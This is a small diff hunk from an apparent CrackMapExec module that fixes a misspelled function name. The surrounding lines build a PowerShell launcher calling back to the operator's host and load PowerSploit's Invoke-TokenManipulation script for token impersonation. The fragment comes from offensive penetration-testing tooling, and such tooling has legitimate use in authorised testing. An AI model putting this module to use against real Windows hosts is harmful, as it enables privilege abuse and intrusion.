@@ -57,7 +57,7 @@ class CMEModule:
                                           port=context.server_port, 
                                           addr=context.localip)
 
-        return reate_ps_command(launcher)
+        return create_ps_command(launcher)
 
     def payload(self, context, command):
         with open(get_ps_script('PowerSploit/Exfiltration/Invoke-TokenManipulation.ps1'), 'r') as ps_script:
